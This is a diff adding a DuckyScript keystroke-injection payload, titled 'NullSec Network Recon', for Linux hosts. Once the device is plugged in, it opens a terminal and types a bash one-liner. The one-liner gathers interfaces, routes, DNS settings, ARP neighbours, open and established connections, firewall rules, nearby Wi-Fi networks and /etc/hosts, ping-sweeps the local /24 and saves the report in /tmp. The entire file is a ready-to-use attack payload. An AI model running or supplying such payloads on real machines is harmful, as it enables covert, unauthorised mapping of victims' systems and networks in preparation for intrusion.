@@ -1,0 +1,19 @@
+REM ========================================
+REM Title:    NullSec Network Recon
+REM Author:   NullSec (bad-antics)
+REM Target:   Linux (Ubuntu/Debian/Arch/Fedora)
+REM Category: recon
+REM Version:  1.0
+REM ========================================
+
+REM Comprehensive network reconnaissance payload.
+REM Maps local network, discovers hosts, enumerates
+REM services, and identifies the network topology.
+REM Uses only built-in tools (no nmap needed).
+
+DELAY 3000
+CTRL-ALT t
+DELAY 1500
+
+STRING bash -c 'R="/tmp/netrecon_$(hostname)_$(date +%s).txt"; echo "=============================" > "$R"; echo " NullSec Network Recon Report" >> "$R"; echo " Host: $(hostname)" >> "$R"; echo " Date: $(date -u)" >> "$R"; echo "=============================" >> "$R"; echo "" >> "$R"; echo "=== INTERFACES ===" >> "$R"; ip -br addr >> "$R" 2>&1; echo "" >> "$R"; echo "=== ROUTES ===" >> "$R"; ip route >> "$R" 2>&1; echo "" >> "$R"; echo "=== DNS CONFIG ===" >> "$R"; cat /etc/resolv.conf >> "$R" 2>&1; echo "" >> "$R"; echo "=== ARP NEIGHBORS ===" >> "$R"; ip neigh show >> "$R" 2>&1; echo "" >> "$R"; echo "=== LISTENING SERVICES ===" >> "$R"; ss -tulnp >> "$R" 2>&1; echo "" >> "$R"; echo "=== ESTABLISHED CONNECTIONS ===" >> "$R"; ss -tnp state established >> "$R" 2>&1; echo "" >> "$R"; echo "=== IPTABLES RULES ===" >> "$R"; iptables -L -n 2>&1 >> "$R" || echo "(need root)" >> "$R"; echo "" >> "$R"; echo "=== WIRELESS NETWORKS ===" >> "$R"; iwlist scan 2>&1 | grep -E "(Cell|ESSID|Signal|Encryption)" >> "$R" || nmcli dev wifi list 2>&1 >> "$R" || echo "(no wireless)" >> "$R"; echo "" >> "$R"; echo "=== SUBNET PING SWEEP ===" >> "$R"; GATEWAY=$(ip route | grep default | awk "{print \$3}"); SUBNET=$(echo "$GATEWAY" | sed "s/\.[0-9]*$//"); echo "Sweeping $SUBNET.0/24..." >> "$R"; for i in $(seq 1 254); do (ping -c1 -W1 "$SUBNET.$i" &>/dev/null && echo "$SUBNET.$i is UP") & done 2>/dev/null; wait; echo "" >> "$R"; echo "=== HOST FILE ===" >> "$R"; cat /etc/hosts >> "$R" 2>&1; echo "" >> "$R"; echo "[+] Report: $R"; cat "$R"' && exit
+ENTER
